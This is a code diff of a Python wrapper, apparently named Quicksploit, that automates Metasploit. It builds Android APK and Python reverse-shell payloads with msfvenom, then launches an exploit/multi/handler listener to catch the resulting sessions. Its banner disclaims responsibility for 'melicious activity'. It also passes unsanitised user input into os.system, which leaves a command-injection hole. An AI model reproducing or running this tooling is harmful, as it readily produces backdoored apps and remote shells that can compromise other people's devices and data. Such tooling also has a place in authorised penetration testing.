@@ -9,6 +9,7 @@ from random import choice
 from time import sleep
 from os import chdir
 import os
+
 def Checking_packge():
     os.system("clear")
     os.system("bash setup.sh")
@@ -22,10 +23,18 @@ def _quicksploit_banner_():
 ║║─║║║║─║║─║║─║║─╚╝║╚╝╝  ║╚══╗║╚═╝║║║───║║─║║─║║─╚╝║║╚╝
 ║╚═╝║║║─║║─║║─║║─╔╗║╔╗║  ╚══╗║║╔══╝║║─╔╗║║─║║─║║───║║──
 ╚══╗║║╚═╝║╔╣─╗║╚═╝║║║║╚╗ ║╚═╝║║║───║╚═╝║║╚═╝║╔╣─╗──║║──
-───╚╝╚═══╝╚══╝╚═══╝╚╝╚═╝ ╚═══╝╚╝───╚═══╝╚═══╝╚══╝──╚╝──{N} ({Y}v0.0.1{N})
-{R}Note{N}: I'm not responsible for your melicious activity.""".format(N=col(),R=col("R"),Y=col("Y")))
+───╚╝╚═══╝╚══╝╚═══╝╚╝╚═╝ ╚═══╝╚╝───╚═══╝╚═══╝╚══╝──╚╝──{N}
+[ {S}Python3{N} ] [ {S}Metsploit Automation{N} ]           ({Y}v0.0.1{N})
+
+{R}Note{N}: I'm not responsible for your melicious activity.""".format(N=col(),R=col("R"),Y=col("Y"),S=col("S")))
+
 
 def col(t="N"):
+    """
+    Configaring Colors
+
+    """
+
     if t == "N":
         return "\u001b[0m"
     if t == "G":
@@ -42,7 +51,16 @@ def col(t="N"):
         return "\u001b[36;1m"
     if t == "DG":
         return "\u001b[32m"
+    if t == "C":
+        return "\u001b[2m"
+
+
 def print_console(host,port,pay):
+    """
+    Formated Print Table
+
+    """
+
     def odd(n):
         if int(n)%2==0:
             return 0
@@ -57,22 +75,32 @@ def print_console(host,port,pay):
     _ls1_ = " "*(int((_len1_+2)/2)-1)
     _ls2_ = " "*(_len2_)
     _ls3_ = " "*(_len3_)
+
     print("""{G}+{L1}----------{L2}-------{L3}---+
 |{LS1}{R}LHOST{G}{LS1}| {R}LPORT{G}{LS2}| {R}{:^{LS3}}{G} |
 +{L1}-----+----{L2}--+----{L3}---+
 | {N}{:{lh}}{G} | {N}{:^{lp}}{G} | {N}{:^{lP}}{G} |
 +{L1}---------{L2}--------{L3}---+\u001b[0m""".format("PAYLOAD",host,port,pay,L1=_lm1_,L2=_lm2_,L3=_lm3_,LS1=_ls1_,LS2=_ls2_,LS3=len(pay),lh=_len1_,lp=_len2_+4,lP=_len3_,R=col("R"),N=col(),G=col("G")))
+    print("[ {P}Exploit{N} ]: exploit/multi/handler".format(P=col("P"),N=col()))
 
 
 
 def console(payload,host="127.0.0.1",port="4444"):
+    """
+    Console Session
+
+    """
     print_console(host,port,payload)
-    sleep(6)
+    sleep(7)
+    print("["+col("Y")+"Preparing for listerning"+col()+"]")
     call(["msfconsole","-q","-x","use exploit/multi/handler;set lhost "+host+";set lport "+port+";set payload "+payload+";exploit;"])
 
 def Payload(payload,name,host,port):
-    sleep(1)
-    print("[{G}*{N}] Generating payload.".format(G=col("G"),N=col()))
+    """
+    Payload sessions
+
+    """
+    sleep(0.3)
     P=col("P")
     N=col()
     cd=pwd()
@@ -81,25 +109,44 @@ def Payload(payload,name,host,port):
     except:
         pass
     if payload[:5] == "andro":
-        name=name+".apk"
-        print("{P}Apk file{N}: ".format(P=P,N=N)+pwd()+"/"+name)
-    if payload[:5] == "pytho":
-        name=name+".py"
-        print("{P}Python file{N}: ".format(P=P,N=N)+pwd()+"/"+name)
-    os.system("msfvenom -p "+payload+" lhost="+host+" lport="+port+" r"+">"+name)
-    chdir(cd)
-def banner1():
-    print("""
- {G}------ Option ------{N}
- {R} 1 {G}- {N}Android
- {R} 2 {G}- {N}Modules
- {R} 3 {G}- {N}Python
- {R} 4 {G}- {N}Search
- {R} 5 {G}- {N}Exit
- {G}--------------------{N}
-                            """.format(G=col("G"),R=col("R"),N=col()))
+        if name[-3:]!= ".apk":
+            name=name+".apk"
+        print("[ {P}Apk file{N} ]: ".format(P=P,N=N)+pwd()+"/"+name)
 
-"  Config  "
+    if payload[:5] == "pytho":
+        if name[-3:]!= ".py":
+            name=name+".py"
+        print("[ {P}Python file{N} ]: ".format(P=P,N=N)+pwd()+"/"+name)
+
+    print("[{G}*{N}] Generating payload.".format(G=col("G"),N=col()))
+    os.system("msfvenom -p "+payload+" lhost="+host+" lport="+port+" r"+">"+name)
+    print("[ {Y}Payload{N} ] Created sucessfully.".format(Y=col("Y"),N=col()))
+    chdir(cd)
+
+
+
+def banner1():
+
+    """
+    Print Initial  banner
+
+    """
+    print("""
+ {G}---------------------- Option ------------------------{N}
+ {R}  1 {G}- {N}[ Android ]     --   {C}[ Android payloads ]{N}
+ {R}  2 {G}- {N}[ Modules ]     --   {C}[ All payload modules ]{N}
+ {R}  3 {G}- {N}[ Python  ]     --   {C}[ Python payloads ]{N}
+ {R}  4 {G}- {N}[ Search  ]     --   {C}[ Search for modules ]{N}
+ {R}  q {G}- {N}[ {R}Exit{N}    ]     --   {C}[ Altrenative:( Q ,5 ) ]{N}
+ {G}------------------------------------------------------{N}
+                            """.format(G=col("G"),R=col("R"),C=col("C"),N=col()))
+
+
+"""
+Configaring module.txt
+
+"""
+
 
 conf=open("module.txt","r")
 List={}
@@ -111,26 +158,39 @@ conf.close()
 
 
 def Search(_word_,List=List):
+
+    """
+    Search module form the backuped list from module.txt
+
+    """
+
     print()
     print("{S}    ------------------ {} -----------------".format(_word_,G=col("G"),S=col("S"))+col())
     for i in List:
         w=search(r"(.*?)"+_word_+"(.*).*",str(List[i]),ASCII)
         try:
-            print("      "+col("R")+str(i)+col("G")+" - "+col()+w.group())
+            print("      "+col("R")+"{:>2}".format(str(i))+col("G")+" - "+col()+w.group())
         except:
             pass
-    print(col("S")+"\n       ----------------------------------"+col())
+    print(col("S")+"\n    -------------------------------------------"+col())
+
 
 
 def banner2(n,List=List):
+
+    """
+    Print Next banner
+
+    """
+
     if n == "1":
         Search("android")
         Load("android")
     elif n == "2":
         print(col("S")+"\n    ----------------- Modules -----------------"+col())
         for i in List:
-            print("      "+col("R")+str(i)+col("G")+" - "+col()+List[i])
-        print(col("S")+"\n   -------------------------------------------"+col())
+            print("      "+col("R")+"{:>2}".format(str(i))+col("G")+" - "+col()+List[i])
+        print(col("S")+"\n    -------------------------------------------"+col())
         Load("module")
     elif n == "3":
         Search("python")
@@ -143,15 +203,22 @@ def banner2(n,List=List):
         else:
             Search(_search_)
             Load("search")
-    elif n == "5":
+    elif n in ("5","q","Q"):
         raise SystemExit()
     else:
         index()
 
 
 def Load(Name="",List=List):
+
+    """
+    Prompt curser for module
+    Configaring Local host ...
+
+    """
+
     _inp_=""
-    print(" {R}     b {G}-{N}  Back\n".format(R=col("R"),G=col("G"),N=col()))
+    print(" {R}      b {G}-{N} Back\n".format(R=col("R"),G=col("G"),N=col()))
     while _inp_=="":
         _inp_=input(col("DG")+"[QSP]["+Name+"] > "+col()).strip()
         if _inp_=="b":
@@ -162,12 +229,12 @@ def Load(Name="",List=List):
         if _inp_ != "":
             for i in List:
                 if str(i) == _inp_:
-                    host=input(col("R")+"LHOST("+col()+"127.0.0.1"+col("R")+")"+col()+": ").strip()
-                    port=input(col("R")+"LPORT  ("+col()+"4444"+col("R")+")   "+col()+": ").strip()
-                    name=input(col("R")+"Name  ("+col()+"Noname"+col("R")+")  "+col()+": ").strip()
-                    confirm=input(col("Y")+"Enter to exploit..........."+col())
+                    host=input(col("R")+"LHOST ("+col()+"127.0.0.1"+col("R")+")"+col()+": ").strip()
+                    port=input(col("R")+"LPORT   ("+col()+"4444"+col("R")+")   "+col()+": ").strip()
+                    name=input(col("R")+"Name  ("+col()+"payload"+col("R")+")  "+col()+": ").strip()
+                    confirm=input(col("C")+"[              ....Enter to Create....               ]"+col())
                     if name == "":
-                        name="Noname"
+                        name="payload"
                     if port == "":
                         port="4444"
                     if host == "":
@@ -175,10 +242,18 @@ def Load(Name="",List=List):
                     T1=Thread(target=Payload,args=(List[i],name,host,port))
                     T1.start()
                     console(List[i],host,port)
+                    raise SystemExit()
                     break
             _inp_=""
 
+
 def index():
+
+    """
+    Call to print Initial banner
+
+    """
+
     call(["clear"])
     B=choice(Blist)
     print(B)
@@ -189,7 +264,10 @@ def index():
         banner2(_inp_)
     else:
         index()
+
 try:
+                                                #Exception
+    call(["clear"])
     index()
 except:
     raise SystemExit()
